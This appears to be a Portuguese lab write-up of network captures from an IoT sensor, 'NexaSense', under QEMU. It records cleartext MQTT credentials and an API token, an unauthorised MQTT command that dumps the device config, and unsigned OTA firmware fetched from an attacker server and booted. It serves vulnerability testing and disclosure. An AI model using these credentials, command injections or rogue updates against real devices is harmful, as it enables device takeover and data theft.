# Analise de trafego - NexaSense (laboratorio QEMU)
# pcaps em network/evidence/. Ferramenta: tshark

## 1. MQTT CONNECT - credenciais em TEXTO CLARO (capture-01)
  src=10.0.2.15 dst=10.0.2.2 client=NXS-000000 user=nexasense pass=Nx-Shared-Fleet-Pass-2026

## 2. MQTT PUBLISH telemetria - token da API trafega em claro (capture-01)
  topico: nexahome/sense/NXS-000000/telemetry
  payload: {"device":"NXS-000000","fw":"1.0.0-proto","temp":24.34,"hum":63.40,"token":"nxh_live_7f3a9c21e8b04d5f9a6c","uptime":2}

## 3. Protocolos observados (sem TLS em nenhuma camada de aplicacao)
  ip                                     frames:77 bytes:8988
    tcp                                  frames:73 bytes:7108
      mqtt                               frames:12 bytes:2029
          tcp.segments                   frames:4 bytes:1159

## 4. Demo A - injecao de comando sem autorizacao (capture-02)
  atacante -> nexahome/sense/NXS-000000/cmd  {"cmd":"get_config"}
  device   -> nexahome/sense/NXS-000000/resp  (340 bytes com toda a config)

## 5. Demo B - OTA sem assinatura (capture-03)
  GET http://10.0.2.2:8000/nexasense.bin (servidor do atacante)
  resultado: 630784 bytes aceitos, boot na particao ota_0 (imagem do atacante)
